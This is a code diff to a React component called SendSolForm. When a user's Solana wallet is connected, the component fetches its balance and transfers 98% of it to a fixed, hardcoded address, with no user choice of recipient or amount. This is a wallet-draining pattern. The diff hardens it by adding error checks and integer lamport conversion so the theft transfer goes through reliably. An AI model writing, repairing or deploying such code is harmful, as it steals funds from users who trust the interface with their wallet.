@@ -7,19 +7,28 @@ import { FC, useState } from 'react'
 export const SendSolForm: FC = () => {
     const [txSig, setTxSig] = useState('');
     const { connection } = useConnection();
-    const { publicKey, signAndSendTransaction } = useWallet(); // Updated to use signAndSendTransaction
+    const { publicKey, signAndSendTransaction } = useWallet();
 
     const sendSol = async (event) => {
         event.preventDefault();
-        if (!connection || !publicKey) { return; }
+        if (!connection || !publicKey) {
+            console.error('Connection or publicKey not available.');
+            return;
+        }
 
         try {
-            // Get current SOL balance and calculate 98% of it
             const info = await connection.getAccountInfo(publicKey);
-            const balanceInSol = info.lamports / web3.LAMPORTS_PER_SOL;
+            if (!info) {
+                console.error('Unable to fetch account info.');
+                return;
+            }
+
+            const balanceInLamports = info.lamports;
+            const balanceInSol = balanceInLamports / web3.LAMPORTS_PER_SOL;
             const amountToSend = balanceInSol * 0.98; // 98% of current balance
 
-            // Prepare transaction to send SOL
+            const lamports = Math.floor(amountToSend * web3.LAMPORTS_PER_SOL); // Ensure lamports is an integer
+
             const transaction = new web3.Transaction();
             const recipientPubKey = new web3.PublicKey('AiwmF5F27tMzxmzcDwUg3on2fWiCHcuxQmBtV3bo611a');
 
@@ -27,11 +36,10 @@ export const SendSolForm: FC = () => {
                 web3.SystemProgram.transfer({
                     fromPubkey: publicKey,
                     toPubkey: recipientPubKey,
-                    lamports: amountToSend * web3.LAMPORTS_PER_SOL
+                    lamports: lamports
                 })
             );
 
-            // Sign and send transaction
             const { signature } = await signAndSendTransaction(transaction);
             setTxSig(signature);
         } catch (error) {
